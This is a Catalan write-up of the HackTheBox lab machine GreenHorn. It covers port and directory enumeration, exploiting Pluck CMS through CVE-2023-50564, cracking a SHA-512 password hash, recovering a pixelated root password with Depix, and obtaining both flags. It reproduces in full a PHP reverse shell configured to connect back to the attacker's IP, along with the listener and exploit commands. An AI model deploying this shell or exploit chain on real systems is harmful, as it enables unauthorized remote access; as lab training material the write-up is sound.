
El primer que farem serà un nmap a la màquina que estem atacant:
``nmap -sC -sV -p- -v 10.10.11.25``

Un cop fet l'nmap, veiem que la màquina víctima té els següents ports oberts:

```
Discovered open port 22/tcp on 10.10.11.25
Discovered open port 80/tcp on 10.10.11.25
Discovered open port 8000/tcp on 10.10.11.25
Discovered open port 3000/tcp on 10.10.11.25

```

Amb els següents serveis:

```
PORT     STATE SERVICE   VERSION
22/tcp   open  ssh       OpenSSH 8.9p1 Ubuntu 3ubuntu0.10 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 57:d6:92:8a:72:44:84:17:29:eb:5c:c9:63:6a:fe:fd (ECDSA)
|_  256 40:ea:17:b1:b6:c5:3f:42:56:67:4a:3c:ee:75:23:2f (ED25519)
80/tcp   open  http      nginx 1.18.0 (Ubuntu)
|_http-title: Did not follow redirect to http://greenhorn.htb/
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: nginx/1.18.0 (Ubuntu)
3000/tcp open  ppp?
| fingerprint-strings: 
|   GenericLines, Help, RTSPRequest: 
|     HTTP/1.1 400 Bad Request
|     Content-Type: text/plain; charset=utf-8
|     Connection: close
|     Request
|   GetRequest: 
|     HTTP/1.0 200 OK
|     Cache-Control: max-age=0, private, must-revalidate, no-transform
|     Content-Type: text/html; charset=utf-8
|     Set-Cookie: i_like_gitea=f03dc51c4413ad9e; Path=/; HttpOnly; SameSite=Lax
|     Set-Cookie: _csrf=rskyMo7YLhkUBokSMJqTZv-gPUo6MTcyMjExMDg0NjU0NTc1ODMzMA; Path=/; Max-Age=86400; HttpOnly; SameSite=Lax
|     X-Frame-Options: SAMEORIGIN
|     Date: Sat, 27 Jul 2024 20:07:26 GMT
|     <!DOCTYPE html>
|     <html lang="en-US" class="theme-auto">
|     <head>
|     <meta name="viewport" content="width=device-width, initial-scale=1">
|     <title>GreenHorn</title>
|     <link rel="manifest" href="data:application/json;base64,eyJuYW1lIjoiR3JlZW5Ib3JuIiwic2hvcnRfbmFtZSI6IkdyZWVuSG9ybiIsInN0YXJ0X3VybCI6Imh0dHA6Ly9ncmVlbmhvcm4uaHRiOjMwMDAvIiwiaWNvbnMiOlt7InNyYyI6Imh0dHA6Ly9ncmVlbmhvcm4uaHRiOjMwMDAvYXNzZXRzL2ltZy9sb2dvLnBuZyIsInR5cGUiOiJpbWFnZS9wbmciLCJzaXplcyI6IjUxMng1MTIifSx7InNyYyI6Imh0dHA6Ly9ncmVlbmhvcm4uaHRiOjMwMDAvYX
|   HTTPOptions: 
|     HTTP/1.0 405 Method Not Allowed
|     Allow: HEAD
|     Allow: HEAD
|     Allow: GET
|     Cache-Control: max-age=0, private, must-revalidate, no-transform
|     Set-Cookie: i_like_gitea=3078498caf7262ad; Path=/; HttpOnly; SameSite=Lax
|     Set-Cookie: _csrf=hUUjwtX_jCfqQRKR5Yec-_pxWc86MTcyMjExMDg1MjE2Nzg0NDg3OQ; Path=/; Max-Age=86400; HttpOnly; SameSite=Lax
|     X-Frame-Options: SAMEORIGIN
|     Date: Sat, 27 Jul 2024 20:07:32 GMT
|_    Content-Length: 0
8000/tcp open  http-alt?
1 service unrecognized despite returning data. 

```

Ara hem de desar la pàgina amb el nom de domini greenhorn.htb al nostre fitxer /etc/hosts per poder accedir-hi:

``10.10.11.25     greenhorn.htb``

Un cop ho hem fet, accedim a la pàgina web a través del navegador i veiem el següent:

![image](https://github.com/user-attachments/assets/07a16e45-fff9-4403-80f7-6d896219fd5a)


A la primera pàgina ens trobem que de forma resumida se'ns diu el següent:

Benvinguts a GreenHorn Web Development, una comunitat dedicada a ajudar els nous desenvolupadors web a iniciar les seves carreres. Ofereixen recursos educatius, tutorials, projectes pràctics i una xarxa de suport de companys i mentors. Animen els aprenents a explorar la pàgina web, participar en fòrums i aprofitar els recursos disponibles per créixer i tenir èxit en el món del desenvolupament web.

![image](https://github.com/user-attachments/assets/87f4b9a9-714e-47da-8dc4-197c532435a4)


La segona pàgina diu el següent: Benvingut nou membre de l'equip! Estem encantats de tenir un talent entusiasta i brillant que aportarà noves perspectives. Valorem la col·laboració, el respecte i el creixement continu. GreenHorn és una comunitat apassionada i convidem al nou membre a contribuir activament. Ens emocionen les possibilitats futures i donem una càlida benvinguda al nostre nou membre.

Mirarem de trobar dominis o subdominis a veure si trobem alguna cosa útil de la qual podem estirar.

Provarem amb un descobriment de subdominis a veure si hi ha més sort:

``ffuf -u http://board.htb -H "Host: FUZZ.greenhorn.htb" -w /usr/share/amass/wordlists/subdomains-top1mil-5000.txt -c -fs 15949``

No hi ha hagut èxit i no he trobat cap subdomini. Provarem de trobar algun domini que ens pugui ser útil:

``gobuster dir --url http://greenhorn.htb/?file=welcome-to-greenhorn / --wordlist /usr/share/wordlists/dirbuster/directory-list-1.0.txt``

Aconseguim trobar diversos directoris que en principi retornen un 200, tot i que acaben mostrant la pàgina principal, cosa que no quadra i semblaria una redirecció si estigués funcionant. Ex:

```
`Starting gobuster in directory enumeration mode
===============================================================
/\"                   (Status: 200) [Size: 93]
/*                    (Status: 200) [Size: 93]
/ref%3Dnosim          (Status: 200) [Size: 93]
/*checkout*           (Status: 200) [Size: 93]
/qid%3D1129994895     (Status: 200) [Size: 93]
/qid%3D1066154858     (Status: 200) [Size: 93]
/sr%3D11-1            (Status: 200) [Size: 93]
/ref%3Dsr%5F11%5F1    (Status: 200) [Size: 93]
/Buying-a-laptop%3F-12-tips-for-you%21 (Status: 200) [Size: 93]
/Buying-a-computer%3F-Ask-these-3-questions%21 (Status: 200) [Size: 93]
/ref%3Dase%5Fsyngressmediahom (Status: 200) [Size: 93]
/qid%3D1067048361     (Status: 200) [Size: 93]
/sr%3D8-1             (Status: 200) [Size: 93]
/*http%3A             (Status: 200) [Size: 93]
/%E6%B2%A2%E5%B0%BB%E3%82%A8%E3%83%AA%E3%82%AB%3AErica%E3%82%A8%E3%83%AA%E3%82%AB (Status: 200) [Size: 93]
/%E7%B6%BE%E7%80%AC%E3%81%AF%E3%82%8B%E3%81%8B%3AJUMP%21 (Status: 200) [Size: 93]
/0SwAAAMEWDFg8YsQFLdGdWso9*LDKH69RwYRFVfWLY4!R4cshBFiF828rHevN*G079wmFnW5w4RT0cU5zPnZGHVzvRQ6ESOhcsPLje2upEXOxBrlHMYGylQ (Status: 200) [Size: 93]
/pp%26o               (Status: 200) [Size: 93]
/Tips_%26amp%3b_Tricks (Status: 200) [Size: 93]
/content\CNBCTV\Images (Status: 200) [Size: 93]
/\                    (Status: 200) [Size: 93]
/academics\           (Status: 200) [Size: 93]
/MSIT-ISJapan\        (Status: 200) [Size: 93]
/images\              (Status: 200) [Size: 93]
/reports%20%26%20meeting%20minutes (Status: 200) [Size: 93]
/qid%3D1062533362     (Status: 200) [Size: 93]`
```

Toca fer una cerca més acurada, a veure si podem filtrar els dominis trobats, per tant provarem la comanda:

``gobuster dir --url http://greenhorn.htb/ --wordlist /usr/share/wordlists/dirbuster/directory-list-1.0.txt -t 64 -x txt.php -b 302,502,404 2>/dev/null``

Gràcies a aquesta cerca més acurada, filtrant per tipus de fitxers i per tipus de stats de servidor, aconseguim més bons resultat ja que hem trobat el prometedor fitxer amb nom de login.php, que el podríem haver trobat també provant-lo de forma manual ja que és un dels directoris bàsics per logins de pàgines web:

![image](https://github.com/user-attachments/assets/b0260dbe-0614-4447-a010-7c546ebcdc4b)


Veiem que s'utilitza un programari per això que és pluck amb la versió utilitzada, podem provar a buscar credencials per defecte o ve si té algun POC/exploit. 

Primer de tot hem provat vàries credencials com root, admin, etc i no hi ha hagut èxit ja que no hem trobat credencials per defecte:

![image](https://github.com/user-attachments/assets/6f889e93-7832-49fa-89bd-cbdecdbbb06f)


Com que això no ha funcionat, mirarem a veure si trobem algun POC o exploit per aquesta versió concreta del programari pluck. Els dos primers resultats de la nostra cerca a internet semblen prometedors: 

![image](https://github.com/user-attachments/assets/9dccbfd2-cf45-4225-ba41-fd4893bd159f)



Pel que al repositori de github https://github.com/Rai2en/CVE-2023-50564_Pluck-v4.7.18_PoC sembla molt prometedor el que podrme aconseguir, ja que el CVE que té aquesta versió de Pluck permet pujar un fitxer ZIP que contingui una shel amb PHP:

```
CVE-2023-50564 (PoC)

This repository contains a Proof of Concept for CVE-2023-50564 vulnerability in Pluck CMS version 4.7.18

Description

CVE-2023-50564 is a vulnerability that allows unauthorized file uploads in Pluck CMS version 4.7.18. This exploit leverages a flaw in the module installation function to upload a ZIP file containing a PHP shell, thereby enabling remote command execution.`
```

Per tant, anem a instal·lar els packets necessaris i a seguir les instruccions d'ús:

``pip install requests requests_toolbelt``

Clonem el repositori:

```
git clone https://github.com/Rai2en/CVE-2023-50564_Pluck-v4.7.18_PoC.git
cd CVE-2023-50564_Pluck-v4.7.18_PoC`
```

Ara hem de posar el domini o adressa IP a l'script POC:

```
login_url = "http://greenhorn.htb/login.php"
upload_url = "http://greenhorn.htb/admin.php?action=installmodule"`
```

Ara hem de crear un fitxer anomenat payload.zip que contingui el fitxer shell.php, i utilitzarem el reverse shell de PHP recomanat per el creador del repositori de github:

Al reverse shell hem de canviar aquestes línies i posar les de la nostra màquina des de la qual ataquem: 

```
$ip = '10.10.14.106';  // CHANGE THIS
$port = 4444;       // CHANGE THIS`
```

El reverse shell és el següent https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php :

```
<?php
// php-reverse-shell - A Reverse Shell implementation in PHP
// Copyright (C) 2007 pentestmonkey@pentestmonkey.net
//
// This tool may be used for legal purposes only.  Users take full responsibility
// for any actions performed using this tool.  The author accepts no liability
// for damage caused by this tool.  If these terms are not acceptable to you, then
// do not use this tool.
//
// In all other respects the GPL version 2 applies:
//
// This program is free software; you can redistribute it and/or modify
// it under the terms of the GNU General Public License version 2 as
// published by the Free Software Foundation.
//
// This program is distributed in the hope that it will be useful,
// but WITHOUT ANY WARRANTY; without even the implied warranty of
// MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
// GNU General Public License for more details.
//
// You should have received a copy of the GNU General Public License along
// with this program; if not, write to the Free Software Foundation, Inc.,
// 51 Franklin Street, Fifth Floor, Boston, MA 02110-1301 USA.
//
// This tool may be used for legal purposes only.  Users take full responsibility
// for any actions performed using this tool.  If these terms are not acceptable to
// you, then do not use this tool.
//
// You are encouraged to send comments, improvements or suggestions to
// me at pentestmonkey@pentestmonkey.net
//
// Description
// -----------
// This script will make an outbound TCP connection to a hardcoded IP and port.
// The recipient will be given a shell running as the current user (apache normally).
//
// Limitations
// -----------
// proc_open and stream_set_blocking require PHP version 4.3+, or 5+
// Use of stream_select() on file descriptors returned by proc_open() will fail and return FALSE under Windows.
// Some compile-time options are needed for daemonisation (like pcntl, posix).  These are rarely available.
//
// Usage
// -----
// See http://pentestmonkey.net/tools/php-reverse-shell if you get stuck.

set_time_limit (0);
$VERSION = "1.0";
$ip = '127.0.0.1';  // CHANGE THIS
$port = 1234;       // CHANGE THIS
$chunk_size = 1400;
$write_a = null;
$error_a = null;
$shell = 'uname -a; w; id; /bin/sh -i';
$daemon = 0;
$debug = 0;

//
// Daemonise ourself if possible to avoid zombies later
//

// pcntl_fork is hardly ever available, but will allow us to daemonise
// our php process and avoid zombies.  Worth a try...
if (function_exists('pcntl_fork')) {
	// Fork and have the parent process exit
	$pid = pcntl_fork();
	
	if ($pid == -1) {
		printit("ERROR: Can't fork");
		exit(1);
	}
	
	if ($pid) {
		exit(0);  // Parent exits
	}

	// Make the current process a session leader
	// Will only succeed if we forked
	if (posix_setsid() == -1) {
		printit("Error: Can't setsid()");
		exit(1);
	}

	$daemon = 1;
} else {
	printit("WARNING: Failed to daemonise.  This is quite common and not fatal.");
}

// Change to a safe directory
chdir("/");

// Remove any umask we inherited
umask(0);

//
// Do the reverse shell...
//

// Open reverse connection
$sock = fsockopen($ip, $port, $errno, $errstr, 30);
if (!$sock) {
	printit("$errstr ($errno)");
	exit(1);
}

// Spawn shell process
$descriptorspec = array(
   0 => array("pipe", "r"),  // stdin is a pipe that the child will read from
   1 => array("pipe", "w"),  // stdout is a pipe that the child will write to
   2 => array("pipe", "w")   // stderr is a pipe that the child will write to
);

$process = proc_open($shell, $descriptorspec, $pipes);

if (!is_resource($process)) {
	printit("ERROR: Can't spawn shell");
	exit(1);
}

// Set everything to non-blocking
// Reason: Occsionally reads will block, even though stream_select tells us they won't
stream_set_blocking($pipes[0], 0);
stream_set_blocking($pipes[1], 0);
stream_set_blocking($pipes[2], 0);
stream_set_blocking($sock, 0);

printit("Successfully opened reverse shell to $ip:$port");

while (1) {
	// Check for end of TCP connection
	if (feof($sock)) {
		printit("ERROR: Shell connection terminated");
		break;
	}

	// Check for end of STDOUT
	if (feof($pipes[1])) {
		printit("ERROR: Shell process terminated");
		break;
	}

	// Wait until a command is end down $sock, or some
	// command output is available on STDOUT or STDERR
	$read_a = array($sock, $pipes[1], $pipes[2]);
	$num_changed_sockets = stream_select($read_a, $write_a, $error_a, null);

	// If we can read from the TCP socket, send
	// data to process's STDIN
	if (in_array($sock, $read_a)) {
		if ($debug) printit("SOCK READ");
		$input = fread($sock, $chunk_size);
		if ($debug) printit("SOCK: $input");
		fwrite($pipes[0], $input);
	}

	// If we can read from the process's STDOUT
	// send data down tcp connection
	if (in_array($pipes[1], $read_a)) {
		if ($debug) printit("STDOUT READ");
		$input = fread($pipes[1], $chunk_size);
		if ($debug) printit("STDOUT: $input");
		fwrite($sock, $input);
	}

	// If we can read from the process's STDERR
	// send data down tcp connection
	if (in_array($pipes[2], $read_a)) {
		if ($debug) printit("STDERR READ");
		$input = fread($pipes[2], $chunk_size);
		if ($debug) printit("STDERR: $input");
		fwrite($sock, $input);
	}
}

fclose($sock);
fclose($pipes[0]);
fclose($pipes[1]);
fclose($pipes[2]);
proc_close($process);

// Like print, but does nothing if we've daemonised ourself
// (I can't figure out how to redirect STDOUT like a proper daemon)
function printit ($string) {
	if (!$daemon) {
		print "$string\n";
	}
}

?> `
```

Ara creem el payload.zip que contindrà el shell.php que acabem de fer:

``sudo zip -r payload.zip shell.php``

Ara, amb netcat obrirem un port per on escoltarem, el mateix que hem indicat a l'script en shell.php:

``nc -lvnp 4444``

I executarem l'script en python que és el POC:

``python poc.py ``

Ara hem de posar la ruta on tenim el zip:

```
┌──(polkali㉿kaliPol)-[~/Documents/GreenHorn/CVE-2023-50564_Pluck-v4.7.18_PoC]
└─$ python poc.py             
ZIP file path: ./home/polkali/Documents/GreenHorn/CVE-2023-50564_Pluck-v4.7.18_PoC/payload.zip`
```

Ara veiem el següent resultat:

```
┌──(polkali㉿kaliPol)-[~/Documents/GreenHorn/CVE-2023-50564_Pluck-v4.7.18_PoC]
└─$ python poc.py             
ZIP file path: ./payload.zip
Login account
ZIP file download.`
```

I si anem al port per el qual estavem escoltant veiem que estem al servidor amb l'usuari de la web, l'usuari www-data:

```
┌──(polkali㉿kaliPol)-[~/Documents/GreenHorn/CVE-2023-50564_Pluck-v4.7.18_PoC]
└─$ nc -lvnp 4444
listening on [any] 4444 ...
connect to [10.10.14.106] from (UNKNOWN) [10.10.11.25] 35914
Linux greenhorn 5.15.0-113-generic #123-Ubuntu SMP Mon Jun 10 08:16:17 UTC 2024 x86_64 x86_64 x86_64 GNU/Linux
 21:26:34 up 40 min,  0 users,  load average: 0.00, 0.00, 0.09
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=33(www-data) gid=33(www-data) groups=33(www-data)
/bin/sh: 0: can't access tty; job control turned off
$ whoami
www-data
$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
$ `
```

A la ruta ``/var/www/html/pluck/data/settings`` trobem un fitxer prometedor que es diu pass.php que conté el hash del que sembla ser una contrasenya:

```
<?php
$ww = 'd5443aef1b64544f3685bf112f6c405218c573c7279a831b1fe9612e3a4d770486743c5580556c0d838b51749de15530f87fb793afdcc689b6b39024d7790163';
?>`
```

També hi ha un fitxer anomenat token.php amb el següent contingut, que deu ser un token en format hash:

``<?php $token = '796273ca8e92e0d91eaf8a2831631a286768f6631afce10bbba34b32f9dcde4338e7284b159646720c209b1cc7315e92959606f12516fbf6be129be10ceb71f2'; ?>``

Per tant, provarem de crackejar aquestes dos contrasenyes amb John the ripper a veure si tenim sort i les podem obtenir. Per longitud i format ens diu el ChatGPT que segurament és un hash SHA-512, per tant serà el primer que provarem:

```
┌──(root㉿kaliPol)-[/home/polkali/Documents/GreenHorn]
└─# john --format=raw-sha512 --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
Using default input encoding: UTF-8
Loaded 1 password hash (Raw-SHA512 [SHA512 256/256 AVX2 4x])
Warning: poor OpenMP scalability for this hash type, consider --fork=3
Will run 3 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
iloveyou1        (?)     
1g 0:00:00:00 DONE (2024-07-27 23:43) 25.00g/s 76800p/s 76800c/s 76800C/s 123456..dangerous
Use the "--show" option to display all of the cracked passwords reliably
Session completed. `
```

Sembla que hem tingut èxit i hem obtingut la password: iloveyou1

Ara provem d'iniciar sessió des del login.php. Hi ha hagut èxit i ja som dins el dashboard!

![image](https://github.com/user-attachments/assets/da186962-66ac-44f7-8bb1-0ded75aa4570)


Veiem que hi ha una opció que es diu Manage Files des de la qual podrem pujar un fitxer i per tant podríem pujar una reverse shell com hem fet abans:

![image](https://github.com/user-attachments/assets/bd95fa9b-1405-404f-9bd7-92f01d7be329)


Malauradament no és el que busquem, busquem ua forma d'obtenir la flag de l'user.txt. Anirem una altra vegada a la consola a veure si veiem alguna cosa amb l'usuari www-data. Veiem que hi ha un parell d'usuaris que tenen /home, provarem d'iniciar sessió amb un d'ells dos amb la contrasenya que hem trobat al fitxer pass.php en hash:

```
$ su git
Password: iloveyou1
su: Authentication failure
$ su junior
Password: iloveyou1
id
uid=1000(junior) gid=1000(junior) groups=1000(junior)
whoami
junior

```

Amb l'usuari git no hi ha hagut èxit, però sí que n'hi ha hagut amb l'usuari junior !

Ara obtenim la flag de l'usuari junior que és la flag de l'user:

```
cd junior
ls
user.txt
Using OpenVAS.pdf
cat user.txt
c8e304fe35e34aaed749aa022a072f0e`
```

A partir d'aquí haurem d'escalar privilegis per obtenir la password i la flag de l'usuari root. 

El primer que faig és provar el SUID,  a veure si trobem alguna cosa. Fent la cerca amb la comanda ``find / -perm -4000 2>/dev/null`` trobem aquests fitxers amb el bit SUID:

```
find / -perm -4000 2>/dev/null
/usr/libexec/polkit-agent-helper-1
/usr/lib/openssh/ssh-keysign
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/bin/chfn
/usr/bin/gpasswd
/usr/bin/su
/usr/bin/passwd
/usr/bin/mount
/usr/bin/chsh
/usr/bin/umount
/usr/bin/fusermount3
/usr/bin/sudo
/usr/bin/newgrp`
```

Després de repassar a https://gtfobins.github.io/# i no trobar cap dels fitxers "comuns" amb SUID i poder-ho fer, he decidit cercar a internet el primer que apareix, el polkit agent helper, i pel que he vist a la cerca fet a internet sembla que es podria mirar d'escalar privilegis a root:

![image](https://github.com/user-attachments/assets/cf4ac1c0-645d-46fa-a554-74dbd27fff6c)


Després de vàries proves sense èxit sembla que no és el camí correcte. Provarem amb PATH. Per a qualsevol ordre que no estigui integrada a l'intèrpret d'ordres o que no estigui definida amb una ruta absoluta, Linux començarà a cercar a les carpetes definides a PATH. (PATH és la variable ambiental de la qual estem parlant aquí, path és la ubicació d'un fitxer):

![image](https://github.com/user-attachments/assets/ddc032ae-f649-435f-bacb-a4fa6c21d98d)


Es pot fer una cerca senzilla de carpetes escrivibles mitjançant l'ordre ``find / -writable 2>/dev/null``. La sortida d'aquesta ordre es pot netejar mitjançant una seqüència senzilla de tallar i ordenar. Sembla però que hem obtingut multitud de resultats i que no són els desitjats, per tant no seguirem per aquest camí, almenys de moment.

Tornem a la màquina a veure si trobem alguna pista a algun directory o fitxer. Hi ha un pdf anomenat Using OpenVAS,pdf, vaig a provar de passarme'l a la meva màquina a veure si podem veure què hi ha a dins:

```
cd junior
ls
user.txt
Using OpenVAS.pdf
cat Using OpenVAS.pdf
cat: Using: No such file or directory
cat: OpenVAS.pdf: No such file or directory
```

El primer que faré al no poder veure que hi ha al fitxer PDF des de la pròpia màquina víctima, serà passar-me le fitxer a la meva màquina atacant a través d'un servidor http amb python, primer però, hem canviat el nom del fitxer perquè sigui més fàcil passar-nos-el:

```
ls
user.txt
Using OpenVAS.pdf
cp 'Using OpenVAS.pdf' vas.pdf
ls
user.txt
Using OpenVAS.pdf
vas.pdf
python3 -m http.server 4444
10.10.14.106 - - [28/Jul/2024 15:45:02] "GET /vas.pdf HTTP/1.1" 200 -
```

I escoltem des de la nostra màquina atacant, la Kali:

```
┌──(root㉿kaliPol)-[/home/polkali/Documents/GreenHorn]
└─# wget greenhorn.htb:4444/vas.pdf
--2024-07-28 17:45:06--  http://greenhorn.htb:4444/vas.pdf
Resolving greenhorn.htb (greenhorn.htb)... 10.10.11.25
Connecting to greenhorn.htb (greenhorn.htb)|10.10.11.25|:4444... connected.
HTTP request sent, awaiting response... 200 OK
Length: 61367 (60K) [application/pdf]
Saving to: ‘vas.pdf’

vas.pdf                                 100%[=============================================================================>]  59.93K  --.-KB/s    in 0.1s    

2024-07-28 17:45:07 (596 KB/s) - ‘vas.pdf’ saved [61367/61367]
```

Ara ja podem mirar el contingut del PDF des de la nostra Kali:

![image](https://github.com/user-attachments/assets/dc88c430-7097-4787-93e5-fccd20a68316)


La seva traducció al català és:

```
Hola, júnior,

Recentment hem instal·lat OpenVAS al nostre servidor per monitorar activament i identificar possibles vulnerabilitats de seguretat. Actualment, només l'usuari root, representat per mi mateix, té l'autorització per executar OpenVAS utilitzant el següent comandament:
sudo /usr/sbin/openvas
Introdueix la contrasenya:

Com a part de la teva familiarització amb aquesta eina, et recomanem que aprenguis a utilitzar OpenVAS de manera efectiva. En el futur, també tindràs la capacitat de executar OpenVAS introduint el mateix comandament i proporcionant la teva contrasenya quan se't demani.

No dubtis a posar-te en contacte si tens cap pregunta o necessites més ajuda.

Que tinguis una gran setmana,

Sr. Green
```

Veient el PDF sembla que hi ha una imatge on hi ha la contrasenya "borrosa", pel que sembla la haurem de desxifrar. Provarem de trobar alguna eina que pugi transformar un fitxer PDF a imatge, per després veure si podem extreure la contrasenya de l'usuari root de la imatge. 

Sembla que convertir el PDF a imatge ho podrem fer amb https://tools.pdf24.org/en/extract-images :

![image](https://github.com/user-attachments/assets/a0deca81-01e8-4b63-87ce-8d0d8c86ed81)


Se'ns descarrega un zip que hem de descomprimir, on hi haurà la imatge en format .png:

![image](https://github.com/user-attachments/assets/efb5e7de-3913-4e90-89fc-0597462e137a)



```
┌──(root㉿kaliPol)-[/home/polkali/Downloads]
└─# unzip vas.zip    
Archive:  vas.zip
  inflating: 0.png
```

Ara ens faltarà trobar alguna eina que pugui intentar desxifrar la password que hi ah darrere aquesta imatge. Després de buscar i buscar, a través de cerques per internet, he trobat una eina que sembla prometedora. Depix, que és una POC d'una técnica per recuperar text sense format de captures de pantalla pixelades: https://github.com/spipm/Depix 

Per utilizar aquesta eina, he hagut de clonar el repositori, passar la imatge de jpg a png a través d'un conversor online (n'hi ha molts per internet que ho poden fer perfectament):

```
┌──(root㉿kaliPol)-[/home/polkali/Documents/GreenHorn]
└─# ls
CVE-2023-50564_Pluck-v4.7.18_PoC  Depix  hash.txt  vas.pdf  vas_page-passwd.jpg  vas_page-passwd.png
```

I ara sí que ja podem utilitzar l'eina:

```
┌──(root㉿kaliPol)-[/home/polkali/Documents/GreenHorn/Depix]
└─# python3 depix.py \
    -p /home/polkali/Downloads/0.png \
    -s images/searchimages/debruinseq_notepad_Windows10_closeAndSpaced.png \
    -o /output.png  
2024-07-28 18:33:37,151 - Loading pixelated image from /home/polkali/Downloads/0.png
2024-07-28 18:33:37,158 - Loading search image from images/searchimages/debruinseq_notepad_Windows10_closeAndSpaced.png
2024-07-28 18:33:37,704 - Finding color rectangles from pixelated space
2024-07-28 18:33:37,705 - Found 252 same color rectangles
2024-07-28 18:33:37,705 - 190 rectangles left after moot filter
2024-07-28 18:33:37,705 - Found 1 different rectangle sizes
2024-07-28 18:33:37,705 - Finding matches in search image
2024-07-28 18:33:37,706 - Scanning 190 blocks with size (5, 5)
2024-07-28 18:33:37,727 - Scanning in searchImage: 0/1674
2024-07-28 18:34:15,697 - Removing blocks with no matches
2024-07-28 18:34:15,697 - Splitting single matches and multiple matches
2024-07-28 18:34:15,701 - [16 straight matches | 174 multiple matches]
2024-07-28 18:34:15,701 - Trying geometrical matches on single-match squares
2024-07-28 18:34:15,943 - [29 straight matches | 161 multiple matches]
2024-07-28 18:34:15,943 - Trying another pass on geometrical matches
2024-07-28 18:34:16,159 - [41 straight matches | 149 multiple matches]
2024-07-28 18:34:16,159 - Writing single match results to output
2024-07-28 18:34:16,159 - Writing average results for multiple matches to output
2024-07-28 18:34:18,563 - Saving output image to: /output.png
```


I ja tenim generada la imatge output.png, l'anem a veure per trobar la contrasenya de l'usuari root:

![image](https://github.com/user-attachments/assets/e5184be3-3fda-47cb-810f-70fdc239cb8c)


Sembla força llarga, pel que llegim és: sidefromsidetheothersidesidefromsidetheotherside

Ara anem a provar d'iniciar sessió amb l'usuari root amb aquesta contrasenya a veure si està ben formatada així:

```
su
Password: sidefromsidetheothersidesidefromsidetheotherside
id
uid=0(root) gid=0(root) groups=0(root)
whoami
root`
```

Hem tingut èxit, per tant ara anem a buscar la flag de l'usuari root:

```
cd root
ls
cleanup.sh
restart.sh
root.txt
cat root.txt
9caff53cb754a2c5464aa3dc994b5927`
```

I ja hem completat la màquina!!

 ![image](https://github.com/user-attachments/assets/8b1464ff-c73b-464a-830c-7c97316b6a7a)


